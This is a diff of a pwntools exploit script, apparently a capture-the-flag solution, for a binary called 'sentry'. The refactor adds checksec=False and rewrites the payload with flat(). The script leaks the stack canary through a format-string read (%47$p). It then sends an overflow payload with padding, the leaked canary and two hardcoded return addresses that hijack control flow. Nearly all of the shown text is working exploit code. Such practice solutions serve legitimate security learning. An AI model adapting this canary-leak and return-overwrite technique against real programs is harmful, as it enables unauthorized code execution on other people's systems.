@@ -5,7 +5,7 @@
 from pwn import *
 
 # Set up pwntools for the correct architecture
-exe = context.binary = ELF(args.EXE or 'sentry')
+exe = context.binary = ELF(args.EXE or 'sentry',checksec=False)
 
 # Many built-in settings can be controlled on the command-line and show up
 # in "args".  For example, to dump all data sent/received, and disable ASLR
@@ -65,17 +65,16 @@ canary_at = 47
 io.clean()
 io.sendline("%{}$p".format(canary_at).encode())
 junk = (io.recvuntil(b": ").decode())
-
-
 canary = int(io.recvline().decode().split(':')[1].encode().strip(), 16)
 info('Canary = 0x%x (%d)', canary, canary)
 
-payload = b'A' * buffer
-payload += p64(canary)
-payload += b'B' * 8
-payload += p64(0x00000000004012f6)
-payload += p64(0x000000000040121d)
-
+payload = flat([
+    b'A' * buffer,
+    p64(canary),
+    b'B' * 8,
+    p64(0x00000000004012f6),
+    p64(0x000000000040121d)
+    ])
 io.clean()
 io.sendline(payload)
 
